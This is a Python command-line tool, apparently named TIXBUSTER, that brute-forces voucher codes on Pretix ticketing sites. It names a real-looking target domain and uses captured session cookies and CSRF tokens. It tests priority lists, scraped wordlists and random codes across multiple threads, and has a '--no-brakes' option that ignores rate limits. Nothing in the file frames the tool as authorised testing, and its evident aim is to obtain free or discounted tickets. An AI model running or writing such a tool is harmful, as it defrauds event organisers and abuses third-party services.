#!/usr/bin/env python3
"""
TIXBUSTER - Main CLI
Pretix voucher code bruteforcer with 2100+ patterns
"""

import argparse
import sys
import json
from datetime import datetime


def normalize_url(url):
    """Normalize URL - add https:// if not present"""
    if not url:
        return None
    url = url.strip()
    if not url.startswith('http://') and not url.startswith('https://'):
        url = f'https://{url}'
    return url.rstrip('/')

from src.wordlist import (
    get_master_wordlist,
    get_priority_codes,
    get_wordlist_stats,
    load_custom_wordlist,
    generate_random_codes
)
from src.session import SessionManager, validate_and_exit_if_invalid
from src.tester import VoucherTester
from src.scraper import EventScraper
from src.pattern_generator import PatternGenerator


def cmd_validate(args):
    """Validate session cookies with IMDARK control test"""
    print("=" * 60)
    print("SESSION VALIDATION")
    print("=" * 60)

    # Check --url flag first, then positional arg
    target_url = getattr(args, 'url_flag', None) or args.url

    if not target_url:
        print("\n[!] Error: No target URL provided")
        print("[!] Usage: python3 main.py validate <url>")
        print("[!] Example: python3 main.py validate tix.darkprague.com")
        print("[!] Or: python3 main.py validate --url https://tix.example.com")
        sys.exit(1)

    base_url = normalize_url(target_url)
    print(f"[*] Target: {base_url}\n")

    manager = SessionManager(base_url=base_url, verbose=args.verbose)
    success, message = manager.validate_session()

    print("\n" + "=" * 60)
    if success:
        print("✓ Session is VALID")
        print("You're ready to start testing vouchers!")
    else:
        print("✗ Session is INVALID")
        print("Update your cookies in src/session.py")
    print("=" * 60)

    return 0 if success else 1


def cmd_test(args):
    """Test voucher codes"""
    print("=" * 60)
    print("TIXBUSTER - PRETIX VOUCHER BRUTEFORCER")
    print("=" * 60)

    # Check --url flag first, then positional arg
    target_url = getattr(args, 'url_flag', None) or args.url

    if not target_url:
        print("\n[!] Error: No target URL provided")
        print("[!] Usage: python3 main.py test <url> [options]")
        print("[!] Example: python3 main.py test tix.darkprague.com --priority")
        print("[!] Or: python3 main.py test --url https://tix.example.com --priority")
        sys.exit(1)

    base_url = normalize_url(target_url)
    print(f"[*] Target: {base_url}")

    # Create session manager
    manager = SessionManager(base_url=base_url, verbose=args.verbose)

    # Validate session first
    print()
    session = validate_and_exit_if_invalid(manager)
    print()

    # Get wordlist
    if args.code:
        codes = [args.code.upper()]
        print(f"[*] Testing single code: {codes[0]}")
    elif args.random:
        codes = generate_random_codes(
            count=args.random,
            length=args.random_length,
            charset=args.random_charset,
            prefix=args.random_prefix,
            suffix=args.random_suffix
        )
        print(f"[*] Testing {len(codes)} random codes ({args.random_charset}, length={args.random_length})")
        if args.random_prefix or args.random_suffix:
            print(f"[*] Pattern: {args.random_prefix}{'X'*args.random_length}{args.random_suffix}")
    elif args.priority:
        codes = get_priority_codes()
        print(f"[*] Testing {len(codes)} priority codes")
    elif args.wordlist:
        codes = load_custom_wordlist(args.wordlist)
        print(f"[*] Loaded {len(codes)} codes from {args.wordlist}")
    elif args.all:
        codes = get_master_wordlist()
        print(f"[*] Testing ALL {len(codes)} patterns (this will take a while!)")
    else:
        # Default: priority codes
        codes = get_priority_codes()
        print(f"[*] Testing {len(codes)} priority codes (use --all for full wordlist)")

    if not codes:
        print("[!] No codes to test!")
        return 1

    # Create tester
    tester = VoucherTester(base_url=manager.base_url, verbose=args.verbose, threads=args.threads, no_brakes=args.no_brakes)

    # Test codes
    print(f"[*] Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    if args.threads > 1:
        print(f"[*] Multi-threading enabled: {args.threads} threads")
    print()

    results = tester.test_batch(codes, session, manager.csrf_token)

    # Print results
    print("\n" + "=" * 60)
    print("TESTING COMPLETE")
    print("=" * 60)

    elapsed = (datetime.now() - tester.start_time).seconds
    print(f"\nTotal time: {elapsed//60} minutes {elapsed%60} seconds")
    print(f"Total tested: {results['tested']}")

    if results['SUCCESS']:
        print(f"\n[!!!] VALID CODES ({len(results['SUCCESS'])}):")
        for code in results['SUCCESS']:
            print(f"      ✓ {code}")

    if results['EXPIRED']:
        print(f"\n[*] Expired but valid format ({len(results['EXPIRED'])}):")
        for code in results['EXPIRED'][:5]:
            print(f"      × {code}")
        if len(results['EXPIRED']) > 5:
            print(f"      ... and {len(results['EXPIRED'])-5} more")

    if results['UNKNOWN']:
        print(f"\n[?] Unknown responses ({len(results['UNKNOWN'])}):")
        for code in results['UNKNOWN']:
            print(f"      ? {code}")

    # Save results
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\n[*] Results saved to {args.output}")

    return 0 if results['SUCCESS'] else 1


def cmd_stats(args):
    """Show wordlist statistics"""
    print("=" * 60)
    print("MASTER WORDLIST STATISTICS")
    print("=" * 60)

    stats = get_wordlist_stats()

    print(f"\nTotal unique patterns: {stats['total_patterns']}")
    print(f"Priority patterns: {stats['priority_patterns']}")

    print("\nBreakdown by category:")
    for category, count in sorted(stats['categories'].items(), key=lambda x: x[1], reverse=True):
        print(f"  {category:20s}: {count:4d} patterns")

    if args.show_priority:
        print("\n" + "=" * 60)
        print("PRIORITY CODES (tested first):")
        print("=" * 60)
        for i, code in enumerate(get_priority_codes(), 1):
            print(f"  {i:2d}. {code}")

    return 0


def cmd_search(args):
    """Search for patterns in wordlist"""
    query = args.query.upper()
    wordlist = get_master_wordlist()
    matches = [code for code in wordlist if query in code]

    print(f"Found {len(matches)} matches for '{query}':\n")
    for code in sorted(matches)[:50]:  # Show first 50
        print(f"  - {code}")

    if len(matches) > 50:
        print(f"\n... and {len(matches)-50} more")

    return 0


def cmd_export(args):
    """Export wordlist to file"""
    wordlist = get_priority_codes() if args.priority else get_master_wordlist()

    with open(args.output, 'w') as f:
        f.write(f"# TIXBUSTER Voucher Wordlist\n")
        f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Total patterns: {len(wordlist)}\n")
        f.write(f"#\n")
        f.write(f"# One code per line, comments start with #\n\n")

        for code in wordlist:
            f.write(f"{code}\n")

    print(f"Exported {len(wordlist)} patterns to {args.output}")
    return 0


def cmd_generate_wordlist(args):
    """Generate wordlist from event website"""
    import os
    from urllib.parse import urlparse

    print("=" * 60)
    print("WORDLIST GENERATION FROM WEB CONTENT")
    print("=" * 60)

    # Validate inputs
    input_count = sum([bool(args.url), bool(args.url_file), bool(args.text_file)])
    if input_count == 0:
        print("[!] Error: Must provide URL, --url-file, or --text-file")
        return 1
    if input_count > 1:
        print("[!] Error: Use only one input method (URL, --url-file, or --text-file)")
        return 1

    # Initialize scraper and generator
    scraper = EventScraper(verbose=args.verbose)
    generator = PatternGenerator(verbose=args.verbose)

    # Handle text file (browser paste)
    if args.text_file:
        print(f"\n[*] Processing raw text from {args.text_file}")
        with open(args.text_file, 'r', encoding='utf-8', errors='ignore') as f:
            raw_text = f.read()

        # Extract directly from text (no web fetching)
        scraped_data = {
            'speakers': scraper.extract_speakers(raw_text),
            'talks': scraper.extract_talks(raw_text),
            'sponsors': scraper.extract_sponsors(raw_text)
        }

        print(f"[*] Extracted from text:")
        print(f"    - {len(scraped_data['speakers'])} speakers")
        print(f"    - {len(scraped_data['talks'])} talks")
        print(f"    - {len(scraped_data['sponsors'])} sponsors")

        source_url = args.text_file  # Use filename for output naming

    # Handle URL file vs single URL
    elif args.url_file:
        # Load URLs from file
        with open(args.url_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]

        print(f"\n[*] Loaded {len(urls)} URLs from {args.url_file}")
        scraped_data = scraper.crawl_multiple_urls(urls, max_depth=args.depth)

        # Use first URL's hostname for output filename
        source_url = urls[0] if urls else "multiple"
    else:
        # Single URL
        print(f"\n[*] Target URL: {args.url}")
        scraped_data = scraper.crawl_event(args.url, max_depth=args.depth)
        source_url = args.url

    # Generate patterns
    print(f"\n[*] Generating voucher patterns...")
    patterns = generator.generate_all(scraped_data, include_variations=not args.no_variations)

    # Create data directory if needed
    os.makedirs('data', exist_ok=True)

    # Determine output filename
    if args.output:
        output_file = args.output
    else:
        # Extract hostname from URL
        hostname = urlparse(source_url).netloc
        # Clean hostname (remove www., replace dots with underscores)
        clean_hostname = hostname.replace('www.', '').replace('.', '_')
        output_file = f"data/{clean_hostname}_wordlist.txt"

    # Check if file exists and prevent overwrite
    if os.path.exists(output_file) and not args.force:
        # Find unique filename
        base_name = output_file.replace('.txt', '')
        counter = 1
        while os.path.exists(f"{base_name}_{counter}.txt"):
            counter += 1
        output_file = f"{base_name}_{counter}.txt"
        print(f"[*] Output file exists, saving to: {output_file}")

    # Save to file
    with open(output_file, 'w') as f:
        f.write(f"# TIXBUSTER Generated Wordlist\n")
        if args.url_file:
            f.write(f"# Sources: {len(urls)} URLs from {args.url_file}\n")
        else:
            f.write(f"# Source: {args.url}\n")
        f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Total patterns: {len(patterns)}\n")
        f.write(f"#\n")
        f.write(f"# Scraped data:\n")
        f.write(f"#   - {len(scraped_data['speakers'])} speakers\n")
        f.write(f"#   - {len(scraped_data['talks'])} talks\n")
        f.write(f"#   - {len(scraped_data['sponsors'])} sponsors\n")
        f.write(f"#\n\n")

        for pattern in patterns:
            f.write(f"{pattern}\n")

    print(f"\n[*] Saved {len(patterns)} patterns to {output_file}")

    # Suggest next steps
    print(f"\n[*] Next steps:")
    print(f"    python3 main.py test --wordlist {output_file}")
    print(f"    python3 main.py test --wordlist {output_file} --threads 5")

    return 0


def main():
    parser = argparse.ArgumentParser(
        description='TIXBUSTER - Pretix Voucher Bruteforcer',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Validate your session cookies
  python3 main.py validate

  # Test a single code
  python3 main.py test --code KXBUDZ

  # Test priority codes (fastest, highest probability)
  python3 main.py test --priority

  # Test all 2100+ patterns (slow but comprehensive)
  python3 main.py test --all

  # Test with custom wordlist
  python3 main.py test --wordlist custom.txt

  # Random bruteforce - 100 random 6-char codes (A-Z,0-9)
  python3 main.py test --random 100

  # Random with DARK prefix (DARKAB12CD, DARK99ZZ)
  python3 main.py test --random 50 --random-prefix DARK --random-length 6

  # Random with FREE suffix (KK3DFREE, X9Y1FREE)
  python3 main.py test --random 50 --random-suffix FREE --random-length 4

  # Random uppercase only (KKBDXZ, PPQRST)
  python3 main.py test --random 100 --random-charset upper

  # Show wordlist statistics
  python3 main.py stats

  # Search for patterns
  python3 main.py search LUNAR

  # Export wordlist to file
  python3 main.py export wordlist.txt
        """
    )

    subparsers = parser.add_subparsers(dest='command', help='Command to run')

    # validate command
    validate_parser = subparsers.add_parser('validate', help='Validate session cookies')
    validate_parser.add_argument('url', nargs='?', help='Target Pretix URL (e.g., tix.darkprague.com or https://tix.darkprague.com)')
    validate_parser.add_argument('--url', '-u', dest='url_flag', help='Target Pretix URL (overrides positional arg)')
    validate_parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')

    # test command
    test_parser = subparsers.add_parser('test', help='Test voucher codes')
    test_parser.add_argument('url', nargs='?', help='Target Pretix URL (e.g., tix.darkprague.com or https://tix.darkprague.com)')
    test_parser.add_argument('--url', '-u', dest='url_flag', help='Target Pretix URL (overrides positional arg)')
    test_parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    test_parser.add_argument('--priority', '-p', action='store_true', help='Test priority codes only')
    test_parser.add_argument('--all', '-a', action='store_true', help='Test all 2100+ patterns')
    test_parser.add_argument('--wordlist', '-w', help='Load codes from custom file')
    test_parser.add_argument('--code', '-c', help='Test a single voucher code')
    test_parser.add_argument('--output', '-o', default='results.json', help='Output file for results')
    test_parser.add_argument('--threads', '-t', type=int, default=1, help='Number of threads (default: 1, safe: 5, aggressive: 10)')
    test_parser.add_argument('--no-brakes', action='store_true', help='Disable auto-throttling on rate limits (full speed always)')

    # Random bruteforce options
    test_parser.add_argument('--random', '-r', type=int, metavar='COUNT',
                            help='Generate COUNT random codes to test')
    test_parser.add_argument('--random-length', type=int, default=6,
                            help='Length of random portion (default: 6)')
    test_parser.add_argument('--random-charset', choices=['upper', 'lower', 'numeric', 'alphanum', 'uppernumeric'],
                            default='uppernumeric',
                            help='Character set (default: uppernumeric A-Z,0-9, or numeric for 0-9 only)')
    test_parser.add_argument('--random-prefix', default='',
                            help='Prefix for random codes (e.g., DARK)')
    test_parser.add_argument('--random-suffix', default='',
                            help='Suffix for random codes (e.g., 2025)')

    # stats command
    stats_parser = subparsers.add_parser('stats', help='Show wordlist statistics')
    stats_parser.add_argument('--show-priority', '-p', action='store_true', help='Show priority codes')

    # search command
    search_parser = subparsers.add_parser('search', help='Search for patterns')
    search_parser.add_argument('query', help='Search query')

    # export command
    export_parser = subparsers.add_parser('export', help='Export wordlist to file')
    export_parser.add_argument('output', help='Output filename')
    export_parser.add_argument('--priority', '-p', action='store_true', help='Export priority codes only')

    # generate-wordlist command
    gen_parser = subparsers.add_parser('generate-wordlist', help='Generate wordlist from event website')
    gen_parser.add_argument('url', nargs='?', help='Event website URL (or use --url-file or --text-file)')
    gen_parser.add_argument('--url-file', '-f', help='File containing list of URLs (one per line)')
    gen_parser.add_argument('--text-file', '-t', help='Raw text file (browser copy/paste content)')
    gen_parser.add_argument('--output', '-o', help='Output file (default: data/<hostname>_wordlist.txt)')
    gen_parser.add_argument('--force', action='store_true', help='Overwrite existing output file')
    gen_parser.add_argument('--depth', '-d', type=int, default=2, help='Crawl depth (default: 2)')
    gen_parser.add_argument('--no-variations', action='store_true', help='Skip common suffix variations')
    gen_parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return 1

    # Route to command handlers
    commands = {
        'validate': cmd_validate,
        'test': cmd_test,
        'stats': cmd_stats,
        'search': cmd_search,
        'export': cmd_export,
        'generate-wordlist': cmd_generate_wordlist
    }

    return commands[args.command](args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(130)
